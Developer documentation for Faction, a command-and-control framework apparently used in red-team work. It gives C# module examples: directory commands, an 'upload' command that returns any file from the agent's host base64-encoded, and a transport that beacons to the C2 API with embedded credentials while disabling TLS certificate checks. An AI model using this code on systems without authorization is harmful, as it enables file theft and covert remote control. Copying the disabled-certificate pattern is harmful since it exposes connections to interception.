# .NET Faction Language Standard

.NET modules leverage the [Faction.Modules.Dotnet.Common](https://github.com/FactionC2/Faction.Modules.Dotnet.Common) library to help make developing easier. This library provides objects to inherit and edit for your needs.

Some general notes on building a Faction .NET module:

* Modules must implement a `Initialization` class in the `Faction.Modules.Dotnet` namespace
* The `Initialization` class must provide either a `GetCommands` or `GetTransports` method that returns a list of Command or Transport objects.

### Commands

.NET commands inherit from the "Command" object. When a command is executed, it leverages the 'Execute' method of its command object. The 'Execute' command is passed a `Dictionary<string, string>` of parameters for the command. Details are how to register parameters are covered later in this document.

The 'Execute' method of the command object is expected to return a 'CommandOutput' object. This object is provided by the common library and includes:

* Complete: Boolean. Did the command complete?
* Success: Boolean. Was the command successful?
* Message: String. Output from the command. This will be displayed on the console.
* Type: String. This is used to differentiate between command output types. Right now, Faction only recognizes one type: 'File'. Everything else is assumed to be output from a regular command.
* ContentId: String. Currently, this is only used for output that contains a file. The ID for this content is its file path.
* Content: String. Currently, this is only used for output that contains a file. Content is the base64 encoded byte array of the file's contents.

#### .NET Implementation Notes

* Commands must be in the `Faction.Modules.Dotnet.Commands` namespace 
* .NET modules use a file called `FactionModules.dotnet.json` for registration with the build server. More details on that are below.

#### Examples

Here is a simple example of implementing a 'Change Directory' command as a .NET command for Faction

```csharp
using System;
using System.IO;
using System.Collections.Generic;
using Faction.Modules.Dotnet.Common;

namespace Faction.Modules.Dotnet.Commands
{
  class ChangeDirectory : Command
  {
    public override string Name { get { return "cd"; } }
    public override CommandOutput Execute(Dictionary<string, string> Parameters = null)
    {
      CommandOutput output = new CommandOutput();
      try
      {
        string path = Parameters["Path"];
        Directory.SetCurrentDirectory(path);
        output.Complete = true;
        output.Success = true;
        output.Message = $"Current directory is now: {path}";

      }
      catch (Exception e)
      {
        output.Complete = true;
        output.Success = false;
        output.Message = e.Message;
      }
      return output;
    }
  }
}
```

Below is an example of an "Upload" command, demonstrating working with file content as part of a command.

```csharp
using System;
using System.IO;
using System.Collections.Generic;
using Faction.Modules.Dotnet.Common;

namespace Faction.Modules.Dotnet.Commands
{
  class Upload : Command
  {
    public override string Name { get { return "upload"; } }
    public override CommandOutput Execute(Dictionary<string, string> Parameters = null)
    {
      CommandOutput output = new CommandOutput();

      string path = Path.GetFullPath(Parameters["Path"]);
      long length = new FileInfo(path).Length;
      output.Complete = true;

      // hard limit of 300mb for file uploads. Because of the b64 we have to do, this would inflate to like 500mb
      if (length > 314572800)
      {
        output.Message = $"File size of {length} is over the 300mb limit of uploads.";
        output.Success = false;
      }
      else
      {
        byte[] fileBytes = File.ReadAllBytes(path);
        output.Success = true;
        output.Message = $"{path} has been uploaded";
        output.Type = "File";
        output.Content = Convert.ToBase64String(fileBytes);
        output.ContentId = path;
      }
      return output;
    }
  }
}
```

Faction's console is smart enough to render a list of objects in the CommandOutputs Message parameter as a table. To leverage this functionality, use Newtonsoft.Json \(or another method\) to render a list of objects to a json list. The example below uses a custom "FileResult" object and Newtonsoft.Json to return a list of files to Faction.

```csharp
using System;
using System.IO;
using System.Collections.Generic;
using Newtonsoft.Json;
using Faction.Modules.Dotnet.Common;

namespace Faction.Modules.Dotnet.Commands
{
  class F2File
  {
    public string Name;
    public string Type;
    public long? Length;
    public DateTime LastAccessTime;
    public DateTime LastWriteTime;
  }

  class ListFiles : Command
  {
    public override string Name { get { return "ls"; } }
    public override CommandOutput Execute(Dictionary<string, string> Parameters=null)
    {
      CommandOutput output = new CommandOutput();
      string pwd = Directory.GetCurrentDirectory();
      if (Parameters.ContainsKey("Path"))
      {
        pwd = Parameters["Path"];
      }

      try
      {
        string[] entries = Directory.GetFileSystemEntries(pwd);
        List<F2File> results = new List<F2File>();

        foreach (string entry in entries)
        {
          F2File f2File = new F2File();
          FileAttributes attr = File.GetAttributes(entry);
          if ((attr & FileAttributes.Directory) == FileAttributes.Directory)
          {
            f2File.Type = "Directory";
            f2File.Name = new DirectoryInfo(entry).Name;
            f2File.Length = null;
            f2File.LastAccessTime = Directory.GetLastAccessTimeUtc(entry);
            f2File.LastWriteTime = Directory.GetLastWriteTime(entry);
          }
          else
          {
            f2File.Type = "File";
            f2File.Name = Path.GetFileName(entry);
            f2File.Length = new FileInfo(entry).Length;
            f2File.LastAccessTime = File.GetLastAccessTimeUtc(entry);
            f2File.LastWriteTime = File.GetLastWriteTimeUtc(entry);
          }
          results.Add(f2File);
        }

        output.Complete = true;
        output.Success = true;
        output.Message = JsonConvert.SerializeObject(results);
      }
      catch (Exception e)
      {
        output.Complete = true;
        output.Success = false;
        output.Message = e.Message; 
      }
      return output;
    }
  }
}
```

## Transports

Transport objects allow an agent to format its checkin's so that they can work with a given Transport Server. These transport objects inherit off the `AgentTransport` class provided by the `Faction.Modules.Dotnet.Common` library. To create a new transport object, you'll need to overwrite the following parameters and methods:

* Name: This is the name of the TransportType that this transport object is used for
* Beacon: This method is used every time an agent checks in. The agent will provide its name and a string and expects a string in return. The beacon method takes this information, sends its to its Transport Server and returns the response from the server.
* Stage: This method is used when a agent payload first starts up and registers with the Faction API. The agent will provide a staging name, staging ID, and a staging message. As with the beacon method, the stage method will need to get this information to the Transport Server.

The example below is taken from [Marauder's DIRECT Transport Module](https://github.com/maraudershell/Marauder/blob/master/Transports/DIRECT/DIRECT.cs).

:::tip Because this module communicates directly with the API, it requires an API key. Normal modules would not require this, since they'd be communicating to a Transport server instead and the transport server will be communicating with the API on their behalf. :::

```csharp
using System;
using System.IO;
using System.Text;
using System.Net;
using System.Collections.Generic;
using System.Reflection;
using Newtonsoft.Json;
using Faction.Modules.Dotnet.Common;

namespace Faction.Modules.Dotnet
{
  public class DIRECT : AgentTransport
  {
    public override string Name { get { return "DIRECT"; } }
    public string Url;
    public string KeyName;
    public string Secret;
    public bool Debug;

    public DIRECT(){
      Stream settingsStream = Assembly.GetExecutingAssembly().GetManifestResourceStream("DIRECT.settings.json");
      Dictionary<string, string> settings = JsonConvert.DeserializeObject<Dictionary<string, string>>((new StreamReader(settingsStream)).ReadToEnd());

      Url = settings["ApiUrl"];
      KeyName = settings["ApiKeyName"];
      Secret = settings["ApiSecret"];
      Debug = Boolean.Parse(settings["Debug"]);
    }

    public override string Stage(string StageName, string StagingId, string Message)
    {
      // Disable Cert Check
      ServicePointManager.ServerCertificateValidationCallback += (sender, cert, chain, sslPolicyErrors) => true;
      string stagingUrl = $"{this.Url}/api/v1/staging/{StageName}/{StagingId}/";
      WebClient wc = new WebClient();
      wc.Headers[HttpRequestHeader.ContentType] = "application/json";
      string authHeader = Convert.ToBase64String(Encoding.UTF8.GetBytes(String.Format("{0}:{1}", KeyName, Secret)));
      wc.Headers[HttpRequestHeader.Authorization] = String.Format("Basic {0}", authHeader);

      Dictionary<string, string> responseDict = new Dictionary<string, string>();
      string jsonMessage = $"{{\"TransportId\": 1,\"Message\": \"{Message}\"}}";
      try
      {
        string response = wc.UploadString(stagingUrl, jsonMessage);
        responseDict = JsonConvert.DeserializeObject<Dictionary<string, string>>(response);
      }
      catch (Exception e)
      {
        responseDict["Message"] = "ERROR";
      }
      return responseDict["Message"];
    }
    public override string Beacon(string AgentName, string Message)
    {
      // Disable cert check
      ServicePointManager.ServerCertificateValidationCallback += (sender, cert, chain, sslPolicyErrors) => true;
      string beaconUrl = $"{this.Url}/api/v1/agent/{AgentName}/checkin/";

      WebClient wc = new WebClient();
      wc.Headers[HttpRequestHeader.ContentType] = "application/json";
      string authHeader = Convert.ToBase64String(Encoding.UTF8.GetBytes(String.Format("{0}:{1}", KeyName, Secret)));
      wc.Headers[HttpRequestHeader.Authorization] = String.Format("Basic {0}", authHeader);

      Dictionary<string, string> responseDict = new Dictionary<string, string>();
      if (!String.IsNullOrEmpty(Message))
      {
        try
        {
          string jsonMessage = $"{{\"TransportId\": 1,\"Message\": \"{Message}\"}}";
          string response = wc.UploadString(beaconUrl, jsonMessage);
          responseDict = JsonConvert.DeserializeObject<Dictionary<string, string>>(response);
        }
        catch (Exception e)
        {
          responseDict["Message"] = "ERROR";
        }
      }
      else
      {
        try
        {
          string getUrl = $"{beaconUrl}?TransportId=1";
          string response = wc.DownloadString(getUrl);
          responseDict = JsonConvert.DeserializeObject<Dictionary<string, string>>(response);
        }
        catch (Exception e)
        {
          responseDict["Message"] = "ERROR";
        }
      }
      return responseDict["Message"];
    }
  }

  public class Initialize {
    public static List<AgentTransport> GetTransports()
    {
      List<AgentTransport> transports = new List<AgentTransport>();
      transports.Add(new DIRECT());
      return transports;
    }
  }
}
```

### Implementation Notes

* The BuildCommand is run on the Faction build server and is used to build the module. This is only required if your module should be rebuilt each time its loaded.
* The BuildLocation parameter is used to tell faction where to find the module. If you specify a build command, the resulting file should end up at this location.

